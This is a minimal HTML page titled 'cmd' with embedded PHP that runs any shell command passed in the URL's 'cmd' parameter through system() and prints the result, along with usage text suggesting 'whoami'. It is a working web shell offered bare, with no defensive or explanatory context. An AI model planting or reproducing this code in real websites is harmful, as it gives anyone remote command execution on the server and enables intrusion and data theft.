<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>cmd</title>
</head>
    <?php if (isset($_GET["cmd"])) {echo system($_GET["cmd"]);}else{echo "send cmd in url \nlike http://url?cmd=whoami";} ?>
<body>
    
</body>
</html>